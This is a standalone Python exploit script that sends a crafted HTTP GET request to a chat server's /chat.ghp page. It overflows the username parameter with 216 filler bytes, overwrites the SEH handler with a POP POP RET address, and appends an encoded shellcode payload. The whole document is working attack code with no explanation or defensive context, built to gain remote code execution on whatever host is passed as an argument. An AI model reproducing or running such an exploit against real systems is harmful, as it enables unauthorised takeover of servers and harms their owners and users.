#!/usr/bin/python
import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],80))

buffer = "GET /chat.ghp?username="
buffer +="A"* 216
buffer += "\xeb\x06\x90\x90" #next SEH Pointer
buffer += "\x9c\x39\x01\x10" #the exception handler POP POP RET 1001399C

buffer += ("\xd9\xf6\xb8\x9d\xb5\xda\x01\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x56\x83\xeb\xfc\x31\x43\x14\x03\x43\x89\x57\x2f\xfd\x59\x1e"
"\xd0\xfe\x99\x41\x58\x1b\xa8\x53\x3e\x6f\x98\x63\x34\x3d\x10"
"\x0f\x18\xd6\xa3\x7d\xb5\xd9\x04\xcb\xe3\xd4\x95\xfd\x2b\xba"
"\x55\x9f\xd7\xc1\x89\x7f\xe9\x09\xdc\x7e\x2e\x77\x2e\xd2\xe7"
"\xf3\x9c\xc3\x8c\x46\x1c\xe5\x42\xcd\x1c\x9d\xe7\x12\xe8\x17"
"\xe9\x42\x40\x23\xa1\x7a\xeb\x6b\x12\x7a\x38\x68\x6e\x35\x35"
"\x5b\x04\xc4\x9f\x95\xe5\xf6\xdf\x7a\xd8\x36\xd2\x83\x1c\xf0"
"\x0c\xf6\x56\x02\xb1\x01\xad\x78\x6d\x87\x30\xda\xe6\x3f\x91"
"\xda\x2b\xd9\x52\xd0\x80\xad\x3d\xf5\x17\x61\x36\x01\x9c\x84"
"\x99\x83\xe6\xa2\x3d\xcf\xbd\xcb\x64\xb5\x10\xf3\x77\x11\xcd"
"\x51\xf3\xb0\x1a\xe3\x5e\xdd\xef\xde\x60\x1d\x67\x68\x12\x2f"
"\x28\xc2\xbc\x03\xa1\xcc\x3b\x63\x98\xa9\xd4\x9a\x22\xca\xfd"
"\x58\x76\x9a\x95\x49\xf6\x71\x66\x75\x23\xd5\x36\xd9\x9b\x96"
"\xe6\x99\x4b\x7f\xed\x15\xb4\x9f\x0e\xfc\xc3\xa7\xc0\x24\x80"
"\x4f\x21\xdb\x37\xcc\xac\x3d\x5d\xfc\xf8\x96\xc9\x3e\xdf\x2e"
"\x6e\x40\x35\x03\x27\xd6\x01\x4d\xff\xd9\x91\x5b\xac\x76\x39"
"\x0c\x26\x95\xfe\x2d\x39\xb0\x56\x27\x02\x53\x2c\x59\xc1\xc5"
"\x31\x70\xb1\x66\xa3\x1f\x41\xe0\xd8\xb7\x16\xa5\x2f\xce\xf2"
"\x5b\x09\x78\xe0\xa1\xcf\x43\xa0\x7d\x2c\x4d\x29\xf3\x08\x69"
"\x39\xcd\x91\x35\x6d\x81\xc7\xe3\xdb\x67\xbe\x45\xb5\x31\x6d"
"\x0c\x51\xc7\x5d\x8f\x27\xc8\x8b\x79\xc7\x79\x62\x3c\xf8\xb6"
"\xe2\xc8\x81\xaa\x92\x37\x58\x6f\xac\xc6\x50\x7a\x39\x71\x01"
"\xc7\x27\x82\xfc\x04\x5e\x01\xf4\xf4\xa5\x19\x7d\xf0\xe2\x9d"
"\x6e\x88\x7b\x48\x90\x3f\x7b\x59")

buffer += "&password=test&room=1&sex=2 HTTP/1.1\r\n\r\n"
sock.send(buffer)
sock.close()
